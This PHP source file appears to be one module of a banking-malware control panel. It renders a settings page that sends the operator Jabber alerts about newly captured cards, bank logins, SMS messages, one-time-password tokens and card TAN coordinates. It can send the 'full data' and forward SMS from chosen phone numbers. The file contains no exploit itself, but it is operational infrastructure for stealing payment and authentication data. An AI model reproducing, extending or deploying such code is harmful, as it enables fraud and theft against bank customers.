<?php
require_once "cmd_mod.php";

class jabber extends modBase
{
	protected $module_name = 'jabber';

	function get_content()
	{
		
		if(hlp::get($this->client_cfg, 'mod_light', false))
		{
			$content = "<div class='row'>
				<div class='col-md-12' style='font-size: 32pt; text-align: center'>
					<span class='fui-user marginRight10'></span>
					Jabber</div>
			</div>
			<div>&nbsp;</div>
			<div><center><h4>Disabled in Light version</h4></center></div>";
			
			return $this->wrap_content("", $content);
		}
		
		$sql = "select * from config where name like('jabber_%') or name like('mod_%')";
		$rows = $this->db->exec($sql, null, true);
		
		$data = array();
		foreach($rows as $row)
			$data[$row['name']] = $row['value'];
			
		$mod_otp_disabled = ($data['mod_otp_tokens'])? '' : 'disabled=""';
		$mod_coords_disabled = ($data['mod_cardtan'])? '' : 'disabled=""';
		$on_sms_show = ($data['jabber_on_sms'])? '' : 'display: none';
		
		$on_sms_checked = ($data['jabber_on_sms'])? ' checked ': '';
		$on_banks_checked = ($data['jabber_on_banks'])? ' checked ': '';
		$on_cards_checked = ($data['jabber_on_cards'])? ' checked ': '';
		$on_otp_checked = ($data['jabber_on_tokens'])? ' checked ': '';
		$on_coords_checked = ($data['jabber_on_coords'])? ' checked ': '';
		
		$notify_type_full = ($data['jabber_notifies_type'] == 'full')? ' selected ': '';
		$notify_type_simple = ($data['jabber_notifies_type'] == 'simple')? ' selected ': '';
		
		
		$content = <<<PHP
		<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<span class="fui-user marginRight10"></span>
				Jabber</div>
		</div>
		<div>&nbsp;</div>
		
		<div class='row'>
			<div class='col-md-6'>
				<div class='row'>
					<div class='col-md-12' style='text-align: center'>
						Account to send messages
						<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="Messages will be sent from that account"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a>
					</div>
				</div>
				<div>&nbsp;</div>
				<div class='row'>
					<div class='col-md-4' style='color: yellow'>Login</div>
					<div class='col-md-8'><input id='jabber_login' type='text' class='form-control' placeholder='user' value="{$data['jabber_login']}" /></div>
				</div><br />
				<div class='row'>
					<div class='col-md-4' style='color: yellow'>Password</div>
					<div class='col-md-8'><input id='jabber_password' type='text' class='form-control' placeholder='123456' value="{$data['jabber_password']}" /></div>
				</div><br />
				<div class='row'>
					<div class='col-md-4' style='color: yellow'>Server</div>
					<div class='col-md-8'><input id='jabber_server' type='text' class='form-control' placeholder='jabber.org' value="{$data['jabber_server']}" /></div>
				</div><br />
				<div class='row'>
					<div class='col-md-4' style='color: yellow'>Port</div>
					<div class='col-md-8'><input id='jabber_port' type='text' class='form-control' placeholder='5222' value="{$data['jabber_port']}" /></div>
				</div><br />
				<div class='row'>
					<div class='col-md-4' style='color: yellow'>&nbsp;</div>
					<div class='col-md-3'>
						<button type='button' class='btn btn-primary'style='width: 100%' onclick='jabber_save(true)'>Test message</button>
					</div>
					<div class='col-md-5' style='color: yellow'>&nbsp;</div>
				</div>
			</div>
			
			<div class='col-md-6'>
				<div class='row'>
					<div class='col-md-6' style='text-align: center'>
						Recepients (3 max)
						<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="List of jabber addresses to get notifies. Use new line as delimiter"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a>
					</div>
					
					<div class='col-md-6' style='text-align: center'>Send notifies on</div>
				</div>
				<div>&nbsp;</div>
				
				<div class='row'>
					<div class='col-md-6'><textarea id='jabber_rcp' class='form-control' rows='5' placeholder='notify@jabber.org'>{$data['jabber_rcp']}</textarea></div>
					
					<div class='col-md-6'>
						<div class='row'>
							<div class='col-md-6'>
								<label class='checkbox' for="notifies-cards">new cards
									<input id="notifies-cards" {$on_cards_checked} type="checkbox" style='display: none' data-toggle="checkbox" />
								</label>
								<label class='checkbox' for="notifies-banks">new banks
									<input id="notifies-banks" {$on_banks_checked} type="checkbox" style='display: none' data-toggle="checkbox" />
								</label>
							</div>
							
							<div class='col-md-6'>
								<label class='checkbox' for="notifies-sms">new sms
									<input id="notifies-sms" {$on_sms_checked} onchange='update_jabber_sms_numbers()' type="checkbox" style='display: none' data-toggle="checkbox" />
								</label>
								<label class='checkbox' for="notifies-tokens">new tokens
									<input id="notifies-tokens" {$on_otp_checked} {$mod_otp_disabled} type="checkbox" style='display: none' data-toggle="checkbox" />
								</label>
								<label class='checkbox' for="notifies-coords">new coordinates
									<input id="notifies-coords" {$on_coords_checked} {$mod_coords_disabled} type="checkbox" style='display: none' data-toggle="checkbox" />
								</label>
							</div>
						</div>
						<div>&nbsp;</div>
						<div class='row'>
							<div class='col-md-12'>
								<select class="form-control" data-toggle="select" id="notifies-type">
									<option value='simple' {$notify_type_simple}>Send only notify</option>
									<option value='full' {$notify_type_full}>Send full data</option>
								</select>
							</div>
						</div>
					</div>
				</div>
				
				<div class='row'>
					<span id='sms_numbers_block' style='{$on_sms_show}'>
						<div>&nbsp;</div>
						<div class='row'>
							<center>SMS numbers (1 at least) 
							<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="Messages from these numbers will be forwarded to jabber"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a>
							</center>
							<div class='col-md-3'>&nbsp;</div>
							<div class='col-md-6'>
								<textarea id='sms-numbers' class='form-control' rows='5' placeholder='35542223570'>{$data['jabber_sms_numbers']}</textarea>
							</div>
							<div class='col-md-3'>&nbsp;</div>
						</div>
					</span>
				</div>

<!--
				<div>&nbsp;</div>
				<div class='row'>
					<center>Send notifies on</center>
					<div class='col-md-1'>&nbsp;</div>
					<div class='col-md-3'>
						<label class='checkbox' for="notifies-cards">new cards
							<input id="notifies-cards" type="checkbox" style='display: none' data-toggle="checkbox" />
						</label>
						<label class='checkbox' for="notifies-banks">new banks
							<input id="notifies-banks" type="checkbox" style='display: none' data-toggle="checkbox" />
						</label>
					</div>
					
					<div class='col-md-3'>
						<label class='checkbox' for="notifies-sms">new sms
							<input id="notifies-sms" onchange='update_jabber_sms_numbers()' type="checkbox" style='display: none' data-toggle="checkbox" />
						</label>
						<label class='checkbox' for="notifies-tokens">new tokens
							<input id="notifies-tokens" type="checkbox" style='display: none' data-toggle="checkbox" />
						</label>
					</div>
					
					<div class='col-md-5'>
						<select class="form-control" data-toggle="select" id="notifies-type">
							<option value='simple'>Send only notify</option>
							<option value='full'>Send full data</option>
						</select>
					</div>
				</div>
				<span id='sms_numbers_block' style='display: none'>
					<div>&nbsp;</div>
					<div class='row'>
						<center>Get SMS from these numbers</center>
						<div class='col-md-3'>&nbsp;</div>
						<div class='col-md-6'>
							<textarea class='form-control' placeholder='Leave empty to get all'></textarea>
						</div>
						<div class='col-md-3'>&nbsp;</div>
					</div>
				</span>
				-->
			</div>
		</div>
		
		<div>&nbsp;</div>
		<div class='row'>
			<div class='col-md-5'>&nbsp;</div>
			<div class='col-md-2' style='text-align: center'><button type='button' class='btn btn-info'style='width: 100%' onclick='jabber_save()'>Save</button></div>
			<div class='col-md-5'>&nbsp;</div>
		</div>
		<div>&nbsp;</div>
		
PHP;
		
		
		return $this->wrap_content("", $content);
	}
}
